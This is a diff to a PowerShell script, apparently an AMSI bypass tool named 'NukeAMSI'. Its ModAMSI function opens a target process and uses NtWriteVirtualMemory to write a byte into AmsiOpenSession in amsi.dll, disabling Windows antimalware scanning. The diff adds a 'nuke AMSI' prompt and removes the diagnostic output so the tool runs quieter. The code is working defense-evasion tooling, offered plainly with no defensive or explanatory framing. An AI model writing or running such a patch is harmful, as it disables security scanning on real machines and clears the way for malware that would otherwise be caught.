@@ -1,3 +1,5 @@
+$confirmation = Read-Host "Are you ready to nuke AMSI from this shell? Press Enter to continue"
+
 Add-Type -TypeDefinition @"
 using System;
 using System.Diagnostics;
@@ -52,7 +54,7 @@ function ModAMSI {
     param (
         [int]$processId
     )
-
+    
     $patch = [byte]0xEB
 
     $objectAttributes = New-Object NukeAMSI+OBJECT_ATTRIBUTES
@@ -64,21 +66,16 @@ function ModAMSI {
     $hHandle = [IntPtr]::Zero
     $status = [NukeAMSI]::NtOpenProcess([ref]$hHandle, [NukeAMSI]::PROCESS_VM_OPERATION -bor [NukeAMSI]::PROCESS_VM_READ -bor [NukeAMSI]::PROCESS_VM_WRITE, [ref]$objectAttributes, [ref]$clientId)
 
-    if ($status -ne 0) {
-        Write-Host "Failed to open process. NtOpenProcess status: $status" -ForegroundColor Red
-        return
-    }
+    if ($status -ne 0) { return }
 
     $amsiHandle = [NukeAMSI]::LoadLibrary("amsi.dll")
     if ($amsiHandle -eq [IntPtr]::Zero) {
-        Write-Host "Failed to load amsi.dll." -ForegroundColor Red
         [NukeAMSI]::NtClose($hHandle)
         return
     }
 
     $amsiOpenSession = [NukeAMSI]::GetProcAddress($amsiHandle, "AmsiOpenSession")
     if ($amsiOpenSession -eq [IntPtr]::Zero) {
-        Write-Host "Failed to find AmsiOpenSession function in amsi.dll." -ForegroundColor Red
         [NukeAMSI]::NtClose($hHandle)
         return
     }
@@ -90,7 +87,6 @@ function ModAMSI {
     $protectStatus = [NukeAMSI]::VirtualProtectEx($hHandle, $patchAddr, $size, [NukeAMSI]::PAGE_EXECUTE_READWRITE, [ref]$oldProtect)
 
     if (-not $protectStatus) {
-        Write-Host "Failed to change memory protection." -ForegroundColor Red
         [NukeAMSI]::NtClose($hHandle)
         return
     }
@@ -98,17 +94,12 @@ function ModAMSI {
     $bytesWritten = [System.UInt32]0
     $status = [NukeAMSI]::NtWriteVirtualMemory($hHandle, $patchAddr, [byte[]]@($patch), 1, [ref]$bytesWritten)
 
-    if ($status -eq 0) {
-        Write-Host "Memory patched successfully at address $patchAddr." -ForegroundColor Green
-    } else {
-        Write-Host "Failed to patch memory. NtWriteVirtualMemory status: $status" -ForegroundColor Red
+    if ($status -ne 0) {
+        [NukeAMSI]::NtClose($hHandle)
+        return
     }
 
     $restoreStatus = [NukeAMSI]::VirtualProtectEx($hHandle, $patchAddr, $size, $oldProtect, [ref]$oldProtect)
-
-    if (-not $restoreStatus) {
-        Write-Host "Failed to restore memory protection." -ForegroundColor Red
-    }
 
     [NukeAMSI]::NtClose($hHandle)
 }
